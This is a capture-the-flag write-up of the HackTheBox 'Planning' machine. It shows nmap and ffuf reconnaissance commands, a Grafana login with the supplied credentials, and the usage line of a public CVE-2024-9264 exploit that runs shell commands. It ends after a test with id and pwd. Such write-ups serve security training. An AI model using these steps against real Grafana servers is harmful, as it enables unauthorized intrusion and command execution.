# Machine Overview

![image](https://github.com/user-attachments/assets/0180991b-c8c3-4f71-a64f-af3461207fe0)

## Given credentials

As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r

# Nmap

Command used: nmap -sC -sV -Pn -oN Planning_nmap.txt 10.10.11.68

![image](https://github.com/user-attachments/assets/84ebbdb6-24a2-4c45-bebc-ac37d19e0e5b)

Found two open ports: 22(SSH), 80(http)

port 80 redirects to http://planning.htb. Add plaaning.htb to /etc/hosts

Looking at the site nothing special in it

![image](https://github.com/user-attachments/assets/564713d3-9ae5-41a1-bcf1-1d8eb49a1582)

# Enumeration

## Fuzzing with ffuf for directory listing 

Command used: ffuf -w /usr/share/wordlists/dirbuster/directory-listing-2.3-medium.txt -u http://planning.htb/FUZZ -t 100 

![image](https://github.com/user-attachments/assets/a80ee0b8-6c09-4111-8386-5a748a1a1dc6)

Looking at the site every url endpoint end in .php trying to enumerate further with ffuf with .php extension

Command used: ffuf -w /usr/share/wordlists/dirbuster/directory-listing-2.3-medium.txt -u http://planning.htb/FUZZ.php -t 100

Still nothing was found

## Fuzzing with ffuf for subdomains

Command used: ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.planning.htb" -u http://planning.htb -t 100 -fc 301

![image](https://github.com/user-attachments/assets/1273a23f-a1fc-4bef-8372-d7eda2c08e47)

Found grafana subdomain. Add grafana.planning.htb to /etc/hosts. Looking at the site there is login form, tried using given credentials to login

![image](https://github.com/user-attachments/assets/cc970d42-e085-40c2-bf8e-2c1356410f17)

From login page i can see grafana version, seeing into it to check if it is vulnerable version or not. Found this [exploit](https://github.com/nollium/CVE-2024-9264) CVE-2024-9264

# CVE overview 

install requirements:

```
pip install requirements.txt
```

Usage:

Command execution (v11.0.0 only)

```
python3 cve.py -u [username] -p [password] -c [shell command] http://10.10.10.10:3030
```

# Exploit

Trying to use CVE-2024-9264 i ran id and pwd commands to see prove of it's work

![image](https://github.com/user-attachments/assets/c7efb8f4-7394-4b6c-912f-c617228b1a20)



